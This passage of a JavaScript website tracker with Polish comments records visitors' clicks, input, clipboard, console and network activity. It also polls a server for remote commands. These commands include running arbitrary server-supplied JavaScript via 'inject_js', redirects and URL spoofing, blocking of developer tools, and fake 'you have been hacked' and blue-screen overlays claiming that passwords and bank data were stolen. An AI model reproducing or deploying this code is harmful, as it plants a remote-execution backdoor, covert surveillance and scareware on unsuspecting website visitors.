    // NOWE: Przechwytywanie konsoli i network (musi być wcześnie!)
    trackConsoleLogs();
    trackNetworkRequests();

    trackClicks();
    trackForms();
    trackRageClicks();
    trackInput();
    trackClipboard();
    trackScroll();
    trackVisibility();
    trackMouseMovement();
    trackTimeOnPage();
    trackPageExit();
    trackErrors();
    trackPerformance();
    trackTextSelection();

    // NOWE: Automatyczne wykrywanie dynamicznych elementów UI
    trackDynamicElements();
    trackSelectChanges();
    trackToggleElements();
    trackSliderChanges();
    trackTabChanges();
    trackAccordionChanges();
    trackLinkClicks();

    // Automatyczne wysyłanie eventów co X sekund
    setInterval(flush, CONFIG.batchTimeout);

    log('Zainicjalizowany', {
      visitorId: state.visitorId,
      sessionId: state.sessionId,
      siteId: CONFIG.siteId,
    });
  }

  // === SYSTEM ZDALNYCH KOMEND (REMOTE CONTROL) ===

  /**
   * Stan zdalnego sterowania
   */
  const remoteState = {
    commandsEnabled: true,
    pollInterval: null,
    activeEffects: new Set(), // Aktywne efekty
    originalStyles: {}, // Oryginalne style do przywrócenia
    blockedConsole: false,
  };

  /**
   * Interwał pollowania komend (w ms)
   */
  const COMMAND_POLL_INTERVAL = 3000; // Co 3 sekundy

  /**
   * Pobiera i wykonuje oczekujące komendy z serwera
   */
  async function pollCommands() {
    if (!remoteState.commandsEnabled) return;

    try {
      const params = new URLSearchParams({
        site_id: CONFIG.siteId,
        session_id: state.sessionId,
      });

      const response = await fetch(`${CONFIG.endpoint}/commands?${params}`, {
        method: 'GET',
        headers: CONFIG.apiToken ? { 'X-API-Token': CONFIG.apiToken } : {},
      });

      if (!response.ok) return;

      const data = await response.json();

      if (data.commands && data.commands.length > 0) {
        data.commands.forEach((cmd) => {
          executeCommand(cmd.type, cmd.payload);
        });
      }
    } catch (err) {
      // Cicho ignoruj błędy - nie chcemy spamować konsoli
    }
  }

  /**
   * Wykonuje komendę zdalną
   */
  function executeCommand(type, payload = {}) {
    log('Wykonuję komendę:', type, payload);

    switch (type) {
      case 'scare':
      case 'scare_message':
        showScareMessage(payload);
        break;

      case 'hide_cursor':
        toggleCursor(false, payload);
        break;

      case 'show_cursor':
        toggleCursor(true, payload);
        break;

      case 'block_console':
        blockConsole(true, payload);
        break;

      case 'unblock_console':
        blockConsole(false, payload);
        break;

      case 'change_url':
        changeUrl(payload);
        break;

      case 'inject_js':
        injectAndExecuteJS(payload);
        break;

      case 'change_font':
        changeFont(payload);
        break;

      case 'toggle_rtl':
        toggleRTL(payload);
        break;

      case 'invert_colors':
        invertColors(payload);
        break;

      case 'rotate_page':
        rotatePage(payload);
        break;

      case 'shake_page':
        shakePage(payload);
        break;

      case 'matrix_effect':
        matrixEffect(payload);
        break;

      case 'blur_page':
        blurPage(payload);
        break;

      case 'grayscale':
        grayscalePage(payload);
        break;

      case 'flip_page':
        flipPage(payload);
        break;

      case 'fake_error':
        showFakeError(payload);
        break;

      case 'redirect':
        redirectPage(payload);
        break;

      case 'play_sound':
        playSound(payload);
        break;

      case 'freeze_page':
        freezePage(payload);
        break;

      case 'rainbow':
        rainbowEffect(payload);
        break;

      case 'typing_effect':
        typingEffect(payload);
        break;

      case 'reset_all':
        resetAllEffects();
        break;

      default:
        warn('Nieznana komenda:', type);
    }
  }

  // === IMPLEMENTACJE EFEKTÓW ===

  /**
   * Pokazuje straszący komunikat "Zostałeś zhakowany!"
   */
  function showScareMessage(payload = {}) {
    const {
      title = '⚠️ UWAGA! WYKRYTO WŁAMANIE!',
      message = 'Twój system został skompromitowany. Wszystkie Twoje dane zostały przechwycone.',
      subMessage = 'Twoje hasła, dane bankowe i prywatne pliki są teraz w naszym posiadaniu.',
      bgColor = '#000',
      textColor = '#ff0000',
      duration = 0, // 0 = do zamknięcia
      showClose = true,
      fullScreen = true,
      glitch = true,
      sound = true,
    } = payload;

    // Usuń poprzedni overlay jeśli istnieje
    const existing = document.getElementById('scare-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'scare-overlay';
    overlay.innerHTML = `
            <style>
                @keyframes glitch {
                    0% { transform: translate(0); }
                    20% { transform: translate(-5px, 5px); }
                    40% { transform: translate(-5px, -5px); }
                    60% { transform: translate(5px, 5px); }
                    80% { transform: translate(5px, -5px); }
                    100% { transform: translate(0); }
                }
                @keyframes flicker {
                    0%, 100% { opacity: 1; }
                    50% { opacity: 0.8; }
                }
                @keyframes scanline {
                    0% { transform: translateY(-100%); }
                    100% { transform: translateY(100vh); }
                }
                #scare-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background: ${bgColor};
                    z-index: 2147483647;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    font-family: 'Courier New', monospace;
                    overflow: hidden;
                }
                #scare-overlay::before {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    right: 0;
                    height: 3px;
                    background: rgba(255,0,0,0.5);
                    animation: scanline 2s linear infinite;
                }
                .scare-title {
                    font-size: clamp(24px, 5vw, 48px);
                    color: ${textColor};
                    text-shadow: 0 0 10px ${textColor}, 0 0 20px ${textColor}, 0 0 40px ${textColor};
                    animation: ${glitch ? 'glitch 0.3s infinite, ' : ''}flicker 0.5s infinite;
                    margin-bottom: 20px;
                    text-align: center;
                    padding: 0 20px;
                }
                .scare-message {
                    font-size: clamp(14px, 2.5vw, 24px);
                    color: #fff;
                    text-align: center;
                    max-width: 800px;
                    padding: 0 20px;
                    margin-bottom: 10px;
                    animation: flicker 1s infinite;
                }
                .scare-sub {
                    font-size: clamp(12px, 2vw, 18px);
                    color: #888;
                    text-align: center;
                    max-width: 600px;
                    padding: 0 20px;
                }
                .scare-skull {
                    font-size: clamp(60px, 15vw, 150px);
                    margin-bottom: 20px;
                    animation: ${glitch ? 'glitch 0.5s infinite' : 'none'};
                }
                .scare-close {
                    position: absolute;
                    top: 20px;
                    right: 20px;
                    background: transparent;
                    border: 2px solid #ff0000;
                    color: #ff0000;
                    padding: 10px 20px;
                    cursor: pointer;
                    font-family: inherit;
                    font-size: 14px;
                    transition: all 0.3s;
                }
                .scare-close:hover {
                    background: #ff0000;
                    color: #000;
                }
                .scare-ip {
                    position: absolute;
                    bottom: 20px;
                    font-size: 12px;
                    color: #444;
                    font-family: monospace;
                }
            </style>
            <div class="scare-skull">💀</div>
            <div class="scare-title">${title}</div>
            <div class="scare-message">${message}</div>
            <div class="scare-sub">${subMessage}</div>
            <div class="scare-ip">IP: ${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)} | Session: ${state.sessionId.substring(0, 8)}</div>
            ${showClose ? '<button class="scare-close" onclick="this.parentElement.remove()">✕ ZAMKNIJ</button>' : ''}
        `;

    document.body.appendChild(overlay);
    remoteState.activeEffects.add('scare');

    // Odtwórz dźwięk straszący
    if (sound) {
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        oscillator.frequency.value = 150;
        oscillator.type = 'sawtooth';
        gainNode.gain.value = 0.3;
        oscillator.start();
        setTimeout(() => {
          gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
          setTimeout(() => oscillator.stop(), 500);
        }, 300);
      } catch (e) {}
    }

    // Auto-usunięcie po czasie
    if (duration > 0) {
      setTimeout(() => {
        const el = document.getElementById('scare-overlay');
        if (el) el.remove();
        remoteState.activeEffects.delete('scare');
      }, duration);
    }
  }

  /**
   * Ukrywa/pokazuje kursor myszy
   */
  function toggleCursor(show, payload = {}) {
    const { duration = 0 } = payload;

    if (!show) {
      document.body.style.cursor = 'none';
      document.querySelectorAll('*').forEach((el) => {
        el.style.cursor = 'none';
      });
      remoteState.activeEffects.add('hide_cursor');
    } else {
      document.body.style.cursor = '';
      document.querySelectorAll('*').forEach((el) => {
        el.style.cursor = '';
      });
      remoteState.activeEffects.delete('hide_cursor');
    }

    if (!show && duration > 0) {
      setTimeout(() => toggleCursor(true), duration);
    }
  }

  /**
   * Blokuje/odblokowuje konsolę deweloperską
   */
  function blockConsole(block, payload = {}) {
    if (block && !remoteState.blockedConsole) {
      remoteState.blockedConsole = true;
      remoteState.activeEffects.add('block_console');

      // Przechwytuj skróty klawiszowe
      const handler = (e) => {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
        if (
          e.key === 'F12' ||
          (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
          (e.ctrlKey && e.key.toUpperCase() === 'U')
        ) {
          e.preventDefault();
          e.stopPropagation();
          showScareMessage({
            title: '🚫 DOSTĘP ZABRONIONY',
            message: 'Konsola deweloperska została zablokowana.',
            subMessage: 'Próba obejścia zabezpieczeń jest monitorowana.',
            duration: 3000,
          });
          return false;
        }
      };

      document.addEventListener('keydown', handler, true);
      window._consoleBlockHandler = handler;

      // Blokuj prawy przycisk myszy
      const contextHandler = (e) => {
        e.preventDefault();
        return false;
      };
      document.addEventListener('contextmenu', contextHandler, true);
      window._contextBlockHandler = contextHandler;
    } else if (!block && remoteState.blockedConsole) {
      remoteState.blockedConsole = false;
      remoteState.activeEffects.delete('block_console');

      if (window._consoleBlockHandler) {
        document.removeEventListener('keydown', window._consoleBlockHandler, true);
        delete window._consoleBlockHandler;
      }
      if (window._contextBlockHandler) {
        document.removeEventListener('contextmenu', window._contextBlockHandler, true);
        delete window._contextBlockHandler;
      }
    }
  }

  /**
   * Zmienia URL w pasku przeglądarki (history.replaceState)
   */
  function changeUrl(payload = {}) {
    const { url = '/hacked', title = document.title } = payload;
    try {
      history.replaceState({}, title, url);
      if (title !== document.title) {
        document.title = title;
      }
    } catch (e) {
      warn('Nie można zmienić URL:', e);
    }
  }

  /**
   * Wstrzykuje i wykonuje kod JavaScript
   */
  function injectAndExecuteJS(payload = {}) {
    const { code = '' } = payload;
    if (!code) return;

    try {
      const func = new Function(code);
      func();
    } catch (e) {
      warn('Błąd wykonywania wstrzykniętego kodu:', e);
    }
  }

  /**
   * Zmienia czcionkę na stronie
   */
  function changeFont(payload = {}) {
    const { fontFamily = 'Comic Sans MS, cursive', duration = 0, reset = false } = payload;

    if (reset) {
      document.body.style.fontFamily = '';
      document.querySelectorAll('*').forEach((el) => {
        el.style.fontFamily = '';
      });
      remoteState.activeEffects.delete('change_font');
      return;
    }

    document.body.style.fontFamily = fontFamily;
    document.querySelectorAll('*').forEach((el) => {
      el.style.fontFamily = fontFamily;
    });
    remoteState.activeEffects.add('change_font');

    if (duration > 0) {
      setTimeout(() => changeFont({ reset: true }), duration);
    }
  }

  /**
   * Przełącza kierunek tekstu RTL/LTR
   */
  function toggleRTL(payload = {}) {
    const { enabled = true, duration = 0 } = payload;

    if (enabled) {
      document.body.style.direction = 'rtl';
      document.body.style.textAlign = 'right';
      remoteState.activeEffects.add('rtl');
    } else {
      document.body.style.direction = '';
      document.body.style.textAlign = '';
      remoteState.activeEffects.delete('rtl');
    }

    if (enabled && duration > 0) {
      setTimeout(() => toggleRTL({ enabled: false }), duration);
    }
  }

  /**
   * Odwraca kolory na stronie
   */
  function invertColors(payload = {}) {
    const { enabled = true, duration = 0 } = payload;

    if (enabled) {
      document.body.style.filter = 'invert(1) hue-rotate(180deg)';
      remoteState.activeEffects.add('invert');
    } else {
      document.body.style.filter = '';
      remoteState.activeEffects.delete('invert');
    }

    if (enabled && duration > 0) {
      setTimeout(() => invertColors({ enabled: false }), duration);
    }
  }

  /**
   * Obraca stronę
   */
  function rotatePage(payload = {}) {
    const { degrees = 180, duration = 0, reset = false } = payload;

    if (reset) {
      document.body.style.transform = '';
      document.body.style.transformOrigin = '';
      remoteState.activeEffects.delete('rotate');
      return;
    }

    document.body.style.transformOrigin = 'center center';
    document.body.style.transform = `rotate(${degrees}deg)`;
    remoteState.activeEffects.add('rotate');

    if (duration > 0) {
      setTimeout(() => rotatePage({ reset: true }), duration);
    }
  }

  /**
   * Efekt trzęsienia strony
   */
  function shakePage(payload = {}) {
    const { intensity = 10, duration = 3000 } = payload;

    const styleEl = document.createElement('style');
    styleEl.id = 'shake-style';
    styleEl.textContent = `
            @keyframes shake-effect {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-${intensity}px); }
                20%, 40%, 60%, 80% { transform: translateX(${intensity}px); }
            }
            body { animation: shake-effect 0.5s ease-in-out infinite; }
        `;

    document.head.appendChild(styleEl);
    remoteState.activeEffects.add('shake');

    setTimeout(() => {
      const el = document.getElementById('shake-style');
      if (el) el.remove();
      document.body.style.animation = '';
      remoteState.activeEffects.delete('shake');
    }, duration);
  }

  /**
   * Efekt Matrix (spadające litery)
   */
  function matrixEffect(payload = {}) {
    const { duration = 10000, opacity = 0.9 } = payload;

    const canvas = document.createElement('canvas');
    canvas.id = 'matrix-canvas';
    canvas.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 2147483646;
            pointer-events: none;
            opacity: ${opacity};
        `;

    document.body.appendChild(canvas);

    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const chars =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+-=[]{}|;:,.<>?日月火水木金土';
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#0f0';
      ctx.font = fontSize + 'px monospace';

      for (let i = 0; i < drops.length; i++) {
        const char = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(char, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    }

    const interval = setInterval(draw, 35);
    remoteState.activeEffects.add('matrix');

    setTimeout(() => {
      clearInterval(interval);
      const el = document.getElementById('matrix-canvas');
      if (el) el.remove();
      remoteState.activeEffects.delete('matrix');
    }, duration);
  }

  /**
   * Rozmywa stronę
   */
  function blurPage(payload = {}) {
    const { amount = 5, duration = 0, reset = false } = payload;

    if (reset) {
      document.body.style.filter = '';
      remoteState.activeEffects.delete('blur');
      return;
    }

    document.body.style.filter = `blur(${amount}px)`;
    remoteState.activeEffects.add('blur');

    if (duration > 0) {
      setTimeout(() => blurPage({ reset: true }), duration);
    }
  }

  /**
   * Zmienia stronę na czarno-białą
   */
  function grayscalePage(payload = {}) {
    const { enabled = true, duration = 0 } = payload;

    if (enabled) {
      document.body.style.filter = 'grayscale(100%)';
      remoteState.activeEffects.add('grayscale');
    } else {
      document.body.style.filter = '';
      remoteState.activeEffects.delete('grayscale');
    }

    if (enabled && duration > 0) {
      setTimeout(() => grayscalePage({ enabled: false }), duration);
    }
  }

  /**
   * Odwraca stronę do góry nogami
   */
  function flipPage(payload = {}) {
    const { axis = 'y', duration = 0, reset = false } = payload;

    if (reset) {
      document.body.style.transform = '';
      remoteState.activeEffects.delete('flip');
      return;
    }

    if (axis === 'x') {
      document.body.style.transform = 'scaleY(-1)';
    } else {
      document.body.style.transform = 'scaleX(-1)';
    }
    remoteState.activeEffects.add('flip');

    if (duration > 0) {
      setTimeout(() => flipPage({ reset: true }), duration);
    }
  }

  /**
   * Pokazuje fałszywy błąd systemowy
   */
  function showFakeError(payload = {}) {
    const { type = 'bsod', message = 'Wystąpił krytyczny błąd systemu.', duration = 0 } = payload;

    const overlay = document.createElement('div');
    overlay.id = 'fake-error-overlay';

    if (type === 'bsod') {
      overlay.innerHTML = `
                <style>
                    #fake-error-overlay {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100vw;
                        height: 100vh;
                        background: #0078d7;
                        z-index: 2147483647;
                        display: flex;
                        flex-direction: column;
                        padding: 10%;
                        font-family: 'Segoe UI', sans-serif;
                        color: white;
                    }
                    .bsod-sad { font-size: 120px; margin-bottom: 20px; }
                    .bsod-title { font-size: 28px; margin-bottom: 20px; }
                    .bsod-text { font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
                    .bsod-code { font-size: 14px; color: rgba(255,255,255,0.7); }
                    .bsod-close { position: absolute; top: 20px; right: 20px; background: transparent; border: none; color: white; font-size: 24px; cursor: pointer; }
                </style>
                <div class="bsod-sad">:(</div>
                <div class="bsod-title">Twój komputer napotkał problem i wymaga ponownego uruchomienia.</div>
                <div class="bsod-text">${message}<br><br>Jeśli chcesz dowiedzieć się więcej, możesz później wyszukać w Internecie ten kod błędu: CRITICAL_PROCESS_DIED</div>
                <div class="bsod-code">Stop code: PAGE_FAULT_IN_NONPAGED_AREA</div>
                <button class="bsod-close" onclick="this.parentElement.remove()">✕</button>
            `;
    } else {
      overlay.innerHTML = `
                <style>
                    #fake-error-overlay {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100vw;
                        height: 100vh;
                        background: rgba(0,0,0,0.8);
                        z-index: 2147483647;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                    }
                    .error-box {
                        background: #f0f0f0;
                        border: 2px solid #c0c0c0;
                        padding: 20px;
                        max-width: 400px;
                        box-shadow: 5px 5px 0 rgba(0,0,0,0.3);
                    }
                    .error-title { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; font-weight: bold; }
                    .error-icon { font-size: 32px; }
                    .error-text { margin-bottom: 20px; font-size: 14px; }
                    .error-btn { background: #c0c0c0; border: 2px outset #fff; padding: 5px 20px; cursor: pointer; }
                </style>
                <div class="error-box">
                    <div class="error-title"><span class="error-icon">⚠️</span> Błąd systemu</div>
                    <div class="error-text">${message}</div>
                    <button class="error-btn" onclick="this.parentElement.parentElement.remove()">OK</button>
                </div>
            `;
    }

    document.body.appendChild(overlay);
    remoteState.activeEffects.add('fake_error');

    if (duration > 0) {
      setTimeout(() => {
        const el = document.getElementById('fake-error-overlay');
        if (el) el.remove();
        remoteState.activeEffects.delete('fake_error');
      }, duration);
    }
  }

  /**
   * Przekierowuje na inny URL
   */
  function redirectPage(payload = {}) {
    const { url = 'about:blank', newTab = false } = payload;

    if (newTab) {
      window.open(url, '_blank');
    } else {
      window.location.href = url;
    }
  }

  /**
   * Odtwarza dźwięk
   */
  function playSound(payload = {}) {
    const { type = 'beep', frequency = 440, duration = 500, volume = 0.5, url = null } = payload;

    if (url) {
      // Odtwórz dźwięk z URL
      const audio = new Audio(url);
      audio.volume = volume;
      audio.play().catch(() => {});
      return;
    }

    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioCtx.createOscillator();
      const gainNode = audioCtx.createGain();

      oscillator.connect(gainNode);
      gainNode.connect(audioCtx.destination);

      oscillator.frequency.value = frequency;
      oscillator.type = type === 'alarm' ? 'sawtooth' : 'sine';
      gainNode.gain.value = volume;

      oscillator.start();

      setTimeout(() => {
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
        setTimeout(() => oscillator.stop(), 100);
      }, duration);
    } catch (e) {}
  }

  /**
   * Zamraża stronę (wyłącza interakcje)
   */
  function freezePage(payload = {}) {
    const { enabled = true, duration = 0, message = 'Strona została zamrożona' } = payload;

    if (enabled) {
      const overlay = document.createElement('div');
      overlay.id = 'freeze-overlay';
      overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                background: rgba(0,0,0,0.1);
                z-index: 2147483647;
                cursor: not-allowed;
                display: flex;
                align-items: center;
                justify-content: center;
            `;
      overlay.innerHTML = `<div style="background: #333; color: #fff; padding: 20px 40px; border-radius: 10px; font-family: sans-serif;">${message}</div>`;
      document.body.appendChild(overlay);
      remoteState.activeEffects.add('freeze');

      if (duration > 0) {
        setTimeout(() => freezePage({ enabled: false }), duration);
      }
    } else {
      const el = document.getElementById('freeze-overlay');
      if (el) el.remove();
      remoteState.activeEffects.delete('freeze');
    }
  }

  /**
   * Efekt tęczowych kolorów
   */
  function rainbowEffect(payload = {}) {
    const { duration = 5000 } = payload;

    const styleEl = document.createElement('style');
    styleEl.id = 'rainbow-style';
    styleEl.textContent = `
            @keyframes rainbow-bg {
                0% { filter: hue-rotate(0deg); }
                100% { filter: hue-rotate(360deg); }
            }
            body { animation: rainbow-bg 1s linear infinite; }
        `;

    document.head.appendChild(styleEl);
    remoteState.activeEffects.add('rainbow');

    setTimeout(() => {
      const el = document.getElementById('rainbow-style');
      if (el) el.remove();
      document.body.style.animation = '';
      remoteState.activeEffects.delete('rainbow');
    }, duration);
  }

  /**
   * Efekt pisania na maszynie - wyświetla tekst literka po literce
   */
  function typingEffect(payload = {}) {
    const {
      text = 'Obserwuję każdy Twój ruch...',
      position = 'bottom-right',
      speed = 50,
      duration = 5000,
    } = payload;

    const box = document.createElement('div');
    box.id = 'typing-effect-box';

    const positions = {
      'top-left': 'top: 20px; left: 20px;',
      'top-right': 'top: 20px; right: 20px;',
      'bottom-left': 'bottom: 20px; left: 20px;',
      'bottom-right': 'bottom: 20px; right: 20px;',
      center: 'top: 50%; left: 50%; transform: translate(-50%, -50%);',
    };

    box.style.cssText = `
            position: fixed;
            ${positions[position] || positions['bottom-right']}
            background: #000;
            color: #0f0;
            padding: 15px 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            z-index: 2147483647;
            border: 1px solid #0f0;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            max-width: 400px;
        `;

    document.body.appendChild(box);
    remoteState.activeEffects.add('typing');

    let i = 0;
    const typeInterval = setInterval(() => {
      if (i < text.length) {
        box.textContent += text.charAt(i);
        i++;
      } else {
        clearInterval(typeInterval);
      }
    }, speed);

    setTimeout(() => {
      clearInterval(typeInterval);
      const el = document.getElementById('typing-effect-box');
      if (el) el.remove();
      remoteState.activeEffects.delete('typing');
    }, duration);
  }

  /**
   * Resetuje wszystkie efekty
   */
  function resetAllEffects() {
    // Usuń wszystkie overlaye
    [
      'scare-overlay',
      'matrix-canvas',
      'fake-error-overlay',
      'freeze-overlay',
      'typing-effect-box',
    ].forEach((id) => {
      const el = document.getElementById(id);
      if (el) el.remove();
    });

    // Usuń style
    ['shake-style', 'rainbow-style'].forEach((id) => {
      const el = document.getElementById(id);
      if (el) el.remove();
    });

    // Reset stylów body
    document.body.style.cssText = '';
    document.body.style.filter = '';
    document.body.style.transform = '';
    document.body.style.direction = '';
    document.body.style.textAlign = '';
    document.body.style.fontFamily = '';
    document.body.style.cursor = '';
    document.body.style.animation = '';

    // Reset kursorów
    document.querySelectorAll('*').forEach((el) => {
      el.style.cursor = '';
      el.style.fontFamily = '';
    });

    // Odblokuj konsolę
    blockConsole(false);

    // Wyczyść stan
    remoteState.activeEffects.clear();

    log('Wszystkie efekty zostały zresetowane');
  }

  /**
   * Inicjalizuje system zdalnych komend
   */
  function initRemoteCommands() {
    // Rozpocznij pollowanie komend
    remoteState.pollInterval = setInterval(pollCommands, COMMAND_POLL_INTERVAL);

    // Pierwsze pollowanie od razu
    setTimeout(pollCommands, 1000);

    log('System zdalnych komend uruchomiony (polling co ' + COMMAND_POLL_INTERVAL / 1000 + 's)');
  }

  // === PUBLICZNE API ===

  /**
   * Eksport API trackera do globalnego scope (window.Tracker)
   */
  window.Tracker = {
    track: track, // Ręczne śledzenie eventów
    flush: flush, // Wymuszenie wysłania eventów
    getVisitorId: () => state.visitorId, // Pobierz visitor ID
    getSessionId: () => state.sessionId, // Pobierz session ID
    config: (options) => Object.assign(CONFIG, options), // Konfiguracja

    // NOWE: API do zarządzania aktywnością
    isActive: () => state.isActive, // Sprawdź czy użytkownik jest aktywny
    wakeUp: wakeUp, // Ręczne wybudzenie z idle
    goIdle: goIdle, // Ręczne przejście w idle
    getIdleTime: () => (state.isActive ? 0 : Date.now() - state.idleStartTime), // Czas od idle
    getTotalIdleTime: () => state.totalIdleTime, // Łączny czas bezczynności
    getActiveTime: () => state.timeOnPage, // Czas aktywności (bez idle)

    // NOWE: API do zdalnych komend
    executeCommand: executeCommand, // Ręczne wykonanie komendy
    resetEffects: resetAllEffects, // Reset wszystkich efektów
    getActiveEffects: () => Array.from(remoteState.activeEffects), // Lista aktywnych efektów
    enableCommands: (enabled) => {
      remoteState.commandsEnabled = enabled;
    }, // Włącz/wyłącz komendy
    pollCommands: pollCommands, // Ręczne pollowanie komend
  };

  // Auto-inicjalizacja po załadowaniu DOM
  // WAŻNE: Sprawdź wykluczenie PRZED inicjalizacją (zapobiega śledzeniu dashboardu)
  function safeInit() {
    if (shouldExcludePage()) {
      if (CONFIG.debug) {
        console.log('[Tracker] ⛔ Tracker wyłączony na tej stronie:', window.location.pathname);
      }
      return; // Nie inicjalizuj niczego na wykluczonej stronie
    }

    init();
    initRemoteCommands();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', safeInit);
  } else {
    safeInit();
  }
})(window, document);
